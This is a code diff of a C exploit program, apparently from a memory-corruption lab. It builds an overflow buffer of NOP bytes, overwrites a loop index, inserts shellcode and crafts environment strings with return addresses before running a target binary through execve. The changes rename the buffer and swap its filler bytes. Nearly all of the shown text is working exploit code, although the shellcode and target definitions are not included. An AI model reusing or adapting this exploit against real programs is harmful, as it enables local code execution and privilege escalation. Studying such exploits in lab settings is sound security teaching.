@@ -13,22 +13,24 @@ int main(void)
   char *args[3];
   char *env[7];
 
-  char exploit[LENGTH] = "";
+  char buf[LENGTH] = "";
 
   int i;
+  // Fill up the buffer with NOP
   while(i < LENGTH / ADDR_LEN){
-	  strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
+	  strcat(buf, "\x90\x90\x90\x90");
 	  i++;
   }
 
-  strcat(exploit, "\x94\x00\x00\x00"); // i = 148 
+  // i
+  strcat(buf, "\x94\x00\x00\x00");
 
   for(i = 0; i < strlen(shellcode); i++){
-    exploit[i] = shellcode[i];
+    buf[i] = shellcode[i];
   }
 
   args[0] = TARGET; 
-  args[1] = exploit; 
+  args[1] = buf; 
   args[2] = NULL;
   
   env[0] = "\x00";
@@ -38,7 +40,9 @@ int main(void)
   env[3] = "\x00";
   env[4] = "\x00";
   
-  env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30";
+  env[5] = "\x90\x90\x90\x90"
+           "\x90\x90\x90\x90"
+           "\xf0\xfd\x21\x30";
   env[6] = NULL;
 
   if (0 > execve(TARGET, args, env))
